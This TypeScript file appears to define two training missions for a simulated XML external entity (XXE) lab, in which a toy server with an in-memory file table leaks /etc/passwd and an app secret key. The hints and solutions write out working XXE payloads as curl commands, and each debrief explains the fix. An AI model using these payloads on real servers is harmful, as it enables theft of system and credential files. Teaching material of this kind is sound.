/**
 * XML external entity (XXE), simulated. The toy server parses the XML you send
 * with external entities switched on, so a `<!ENTITY ... SYSTEM "file://...">`
 * declaration makes the parser read a file off the server's disk and drop it
 * into the document. Every file here comes from a table in the closure. The fix,
 * in the debrief: turn external entities and DOCTYPE off in the XML parser.
 */
import { flagFrom, submitted, type Mission } from "../kit";
import { attackBox, ok, bad, notFound } from "./kit";
import type { Site } from "@/lib/shell/http";

/** A careless XML parse: resolve one SYSTEM file entity, then return the <data> text. */
function parseXml(body: string, disk: Record<string, string>): { out?: string; error?: string } {
  const ent = /<!ENTITY\s+(\w+)\s+SYSTEM\s+["']file:\/\/([^"']+)["']\s*>/i.exec(body);
  let resolved = body;
  if (ent) {
    const [, name, path] = ent;
    const file = disk[path as string];
    if (file === undefined) return { error: `parser error: could not open file://${path}` };
    resolved = resolved.replace(new RegExp(`&${name};`, "g"), file);
  }
  const data = /<data>([\s\S]*?)<\/data>/i.exec(resolved);
  if (!data) return { error: "parser error: no <data> element" };
  return { out: data[1] as string };
}

export const XXE: Mission[] = [
  {
    id: "break-xxe-1",
    title: "Make the parser read a file",
    brief:
      "`import.lab/import` takes an XML document by POST and echoes the `<data>` element back. Its parser still resolves external entities, so a `<!DOCTYPE>` that declares one pointing at a file will paste that file into your document. Read `/etc/passwd`.",
    greeting: "XXE: you declare an entity that is really a file path, and the parser helpfully fetches it for you.",
    hints: [
      "Add a DOCTYPE that declares an entity from a file, then use the entity inside `<data>`.",
      "Send it on one line: `<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><data>&x;</data>`.",
      "`curl -s -d '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><data>&x;</data>' -H 'Content-Type: application/xml' import.lab/import`",
    ],
    build: (rng) => {
      const flag = flagFrom(rng);
      const disk: Record<string, string> = {
        "/etc/passwd": `root:x:0:0:root:/root:/bin/bash\nana:x:1000:1000::/home/ana:/bin/bash\n# provisioning note: ${flag}\n`,
      };
      const site: Site = (r) => {
        if (r.path !== "/import" || r.method !== "POST") return notFound;
        const res = parseXml(r.body, disk);
        if (res.error) return bad(400, `${res.error}\n`);
        return ok(`Imported: ${res.out}\n`);
      };
      return { shell: attackBox({ "import.lab": site }), flag };
    },
    passed: submitted,
    solve: (w) => [
      `curl -s -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY x SYSTEM "file:///etc/passwd">]><data>&x;</data>' -H 'Content-Type: application/xml' import.lab/import`,
      `submit ${w.flag}`,
    ],
    notEnough: () => [`curl -s -d '<data>hello</data>' import.lab/import`],
    debrief:
      "The parser treated your entity as a file to open. Disable DOCTYPE processing and external entities in the XML library (for many parsers, one setting), or move to a format without entities. Never parse untrusted XML with a default, entity-resolving parser.",
  },
  {
    id: "break-xxe-2",
    title: "Reach the app's own secret",
    brief:
      "Same server, `import.lab/import`. The app keeps its API key in `/var/lib/app/secret.key`, outside anything a user should see. Pull it out the same way, and submit the code inside.",
    hints: [
      "Point the entity at the secret file instead: `file:///var/lib/app/secret.key`.",
      "`curl -s -d '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY x SYSTEM \"file:///var/lib/app/secret.key\">]><data>&x;</data>' import.lab/import`",
    ],
    build: (rng) => {
      const flag = flagFrom(rng);
      const disk: Record<string, string> = {
        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\n",
        "/var/lib/app/secret.key": `API_KEY=${flag}\n`,
      };
      const site: Site = (r) => {
        if (r.path !== "/import" || r.method !== "POST") return notFound;
        const res = parseXml(r.body, disk);
        if (res.error) return bad(400, `${res.error}\n`);
        return ok(`Imported: ${res.out}\n`);
      };
      return { shell: attackBox({ "import.lab": site }), flag };
    },
    passed: submitted,
    solve: (w) => [
      `curl -s -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY x SYSTEM "file:///var/lib/app/secret.key">]><data>&x;</data>' import.lab/import`,
      `submit ${w.flag}`,
    ],
    notEnough: () => [`curl -s -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY x SYSTEM "file:///etc/passwd">]><data>&x;</data>' import.lab/import`],
    debrief:
      "Once entity resolution is on, every file the web process can read is in reach, including the app's own keys and config. The one control that holds is to disable external entities in the parser; file permissions and folders won't save you.",
  },
];
